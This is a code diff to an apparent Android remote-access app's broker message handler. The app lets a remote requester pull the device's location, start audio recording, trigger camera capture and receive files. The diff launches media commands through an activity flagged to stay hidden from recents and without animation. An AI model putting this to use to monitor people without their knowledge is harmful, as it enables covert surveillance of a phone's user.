@@ -25,17 +25,17 @@ import android.util.Log;
 
 import com.droid.remoteaccess.feature.Constantes;
 import com.droid.remoteaccess.feature.Contato;
+import com.droid.remoteaccess.activitys.RemoteMediaCommandActivity;
 import com.droid.remoteaccess.dbase.Persintencia;
 import com.droid.remoteaccess.feature.Localizacao;
 import com.droid.remoteaccess.gdrive.CreateFileActivity;
 import com.droid.remoteaccess.location.DroidLocation;
+import com.droid.remoteaccess.others.DevicePresence;
 import com.droid.remoteaccess.others.Methods;
 import com.droid.remoteaccess.recorder.DroidAudioRecorder;
-import com.droid.remoteaccess.recorder.DroidCameraCaptureService;
 
 import java.io.File;
 
-import androidx.core.content.ContextCompat;
 import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 
 public final class BrokerMessageHandler {
@@ -45,6 +45,7 @@ public final class BrokerMessageHandler {
     private static final String PROCESSED_RESPONSES = "processed_response_ids";
     private static final String PROCESSED_FILES = "processed_file_ids";
     private static final long AUDIO_START_RESPONSE_TIMEOUT_MS = 9000;
+    private static final long MEDIA_FOREGROUND_RESPONSE_TIMEOUT_MS = 8000;
 
 
     //private String ChamadaBroadCastPorComandoTexto() {
@@ -55,8 +56,8 @@ public final class BrokerMessageHandler {
     }
 
 
-    private static void sendResponseToServer(Context context, String token_to, String message, Localizacao localizacao,
-                                             String requesterId, String requesterDevice, String commandId) {
+    public static void sendResponseToServer(Context context, String token_to, String message, Localizacao localizacao,
+                                            String requesterId, String requesterDevice, String commandId) {
 
         try {
             Bundle data = new Bundle();
@@ -132,6 +133,11 @@ public final class BrokerMessageHandler {
         }
 
         if (message != null) {
+            if (Constantes.MESSAGE_PRESENCE.equals(message)) {
+                DevicePresence.updateFromMessage(serviceContext, data);
+                return;
+            }
+
             if (Constantes.FILE_TRANSFER_AUDIO.equals(message)) {
                 handleFileResponse(serviceContext, data, id_from, id_to, device_to, command_id,
                         "r:ua", "audio");
@@ -171,6 +177,7 @@ public final class BrokerMessageHandler {
                 mIntent.setAction(Constantes.RECEIVERRESPONSECONTROLEREMOTO);
                 mIntent.addCategory(Intent.CATEGORY_DEFAULT);
                 mIntent.putExtra(Constantes.MESSAGE, message);
+                mIntent.putExtra(Constantes.COMMAND_ID, command_id);
 
                 if (message.equalsIgnoreCase("r:l"))
                 {
@@ -235,6 +242,12 @@ public final class BrokerMessageHandler {
 
                 if (message.startsWith("l")) {
                     Localizacao localizacao = DroidLocation.MyLocation(serviceContext.getApplicationContext());
+                    if (localizacao == null) {
+                        Log.w(TAG, "Location command failed: no valid location");
+                        sendResponseToServer(serviceContext, responseToken, "r:" + message + ":error",
+                                null, id_from, device_from, command_id);
+                        return;
+                    }
                     Log.i(TAG, "Location command handled");
                     sendResponseToServer(serviceContext, responseToken, "r:" + message, localizacao, id_from, device_from, command_id);
 
@@ -247,48 +260,90 @@ public final class BrokerMessageHandler {
 
     private static void startCameraCaptureCommand(Context serviceContext, String responseToken, String requesterId,
                                                   String requesterDevice, String commandId, String message) {
-        Intent intentService = new Intent(serviceContext.getApplicationContext(), DroidCameraCaptureService.class);
-        intentService.putExtra(Constantes.CHAMADAPORCOMANDOTEXTO, message);
-        intentService.putExtra(Constantes.REPLY_TOKEN, responseToken);
-        intentService.putExtra(Constantes.ID_FROM, requesterId);
-        intentService.putExtra(Constantes.DEVICE_FROM, requesterDevice);
-        intentService.putExtra(Constantes.COMMAND_ID, commandId);
-
-        try {
-            ContextCompat.startForegroundService(serviceContext.getApplicationContext(), intentService);
-        } catch (Exception ex) {
-            Log.e(TAG, "Failed to start camera command: " + message, ex);
-            String response = "r:" + message + ":error";
-            sendResponseToServer(serviceContext, responseToken, response, null, requesterId, requesterDevice, commandId);
-        }
+        startMediaCommandActivity(serviceContext, responseToken, requesterId, requesterDevice, commandId, message);
     }
 
     private static void startAudioRecorderCommand(Context serviceContext, String responseToken, String requesterId,
                                                   String requesterDevice, String commandId, String message) {
-        Intent intentService = new Intent(serviceContext.getApplicationContext(), DroidAudioRecorder.class);
-        intentService.putExtra(Constantes.CHAMADAPORCOMANDOTEXTO, message);
-        intentService.putExtra(Constantes.REPLY_TOKEN, responseToken);
-        intentService.putExtra(Constantes.ID_FROM, requesterId);
-        intentService.putExtra(Constantes.DEVICE_FROM, requesterDevice);
-        intentService.putExtra(Constantes.COMMAND_ID, commandId);
-
         try {
             if (message.equalsIgnoreCase("ar") || message.equalsIgnoreCase("ar5")
                     || message.equalsIgnoreCase("ar10") || message.equalsIgnoreCase("ar15")) {
                 DroidAudioRecorder.clearAudioCommandResponse(serviceContext, commandId);
-                ContextCompat.startForegroundService(serviceContext.getApplicationContext(), intentService);
                 if (message.equalsIgnoreCase("ar")) {
                     scheduleAudioStartWatchdog(serviceContext.getApplicationContext(), responseToken, requesterId,
                             requesterDevice, commandId);
                 }
-            } else {
-                serviceContext.startService(intentService);
             }
+            startMediaCommandActivity(serviceContext, responseToken, requesterId, requesterDevice, commandId, message);
         } catch (Exception ex) {
             Log.e(TAG, "Failed to start audio recorder command: " + message, ex);
             String response = "r:" + message + ":error";
             sendResponseToServer(serviceContext, responseToken, response, null, requesterId, requesterDevice, commandId);
         }
+    }
+
+    private static void startMediaCommandActivity(Context serviceContext, String responseToken, String requesterId,
+                                                  String requesterDevice, String commandId, String message) {
+        Context appContext = serviceContext.getApplicationContext();
+        Intent intent = new Intent(appContext, RemoteMediaCommandActivity.class);
+        intent.putExtra(Constantes.CHAMADAPORCOMANDOTEXTO, message);
+        intent.putExtra(Constantes.REPLY_TOKEN, responseToken);
+        intent.putExtra(Constantes.ID_FROM, requesterId);
+        intent.putExtra(Constantes.DEVICE_FROM, requesterDevice);
+        intent.putExtra(Constantes.COMMAND_ID, commandId);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                | Intent.FLAG_ACTIVITY_NO_ANIMATION
+                | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+
+        try {
+            RemoteMediaCommandActivity.clearMediaCommandStarted(appContext, commandId);
+            appContext.startActivity(intent);
+            scheduleMediaForegroundWatchdog(appContext, responseToken, requesterId, requesterDevice, commandId, message);
+        } catch (Exception ex) {
+            Log.e(TAG, "Failed to foreground media command: " + message, ex);
+            sendResponseToServer(serviceContext, responseToken, getMediaStartErrorResponse(message),
+                    null, requesterId, requesterDevice, commandId);
+        }
+    }
+
+    private static String getMediaStartErrorResponse(String message) {
+        if (message == null || message.isEmpty()) {
+            return "r:error";
+        }
+        if (message.equalsIgnoreCase("pf") || message.equalsIgnoreCase("pb") || message.equalsIgnoreCase("pr")) {
+            return "r:up:error";
+        }
+        if (message.startsWith("v")) {
+            return "r:uv:error";
+        }
+        if (message.startsWith("a")) {
+            return "r:ar:error";
+        }
+        return "r:" + message + ":error";
+    }
+
+    private static void scheduleMediaForegroundWatchdog(final Context context, final String responseToken,
+                                                        final String requesterId, final String requesterDevice,
+                                                        final String commandId, final String message) {
+        if (commandId == null || commandId.isEmpty()) {
+            return;
+        }
+        Thread watchdog = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Thread.sleep(MEDIA_FOREGROUND_RESPONSE_TIMEOUT_MS);
+                    if (RemoteMediaCommandActivity.hasMediaCommandStarted(context, commandId)) {
+                        return;
+                    }
+                    Log.w(TAG, "Media command did not reach foreground activity, sending error response: " + commandId);
+                    sendResponseToServer(context, responseToken, getMediaStartErrorResponse(message), null,
+                            requesterId, requesterDevice, commandId);
+                } catch (InterruptedException ignored) {
+                }
+            }
+        }, "MediaForegroundWatchdog");
+        watchdog.start();
     }
 
     private static boolean isCameraCaptureCommand(String message) {
@@ -353,6 +408,7 @@ public final class BrokerMessageHandler {
             mIntent.setAction(Constantes.RECEIVERRESPONSECONTROLEREMOTO);
             mIntent.addCategory(Intent.CATEGORY_DEFAULT);
             mIntent.putExtra(Constantes.MESSAGE, responseMessage);
+            mIntent.putExtra(Constantes.COMMAND_ID, commandId);
             mIntent.putExtra(Constantes.FILE_LOCAL_PATH, receivedFile.getAbsolutePath());
             mIntent.putExtra(Constantes.NOTIFICATION_SHOWN, notificationShown);
             LocalBroadcastManager.getInstance(serviceContext).sendBroadcast(mIntent);
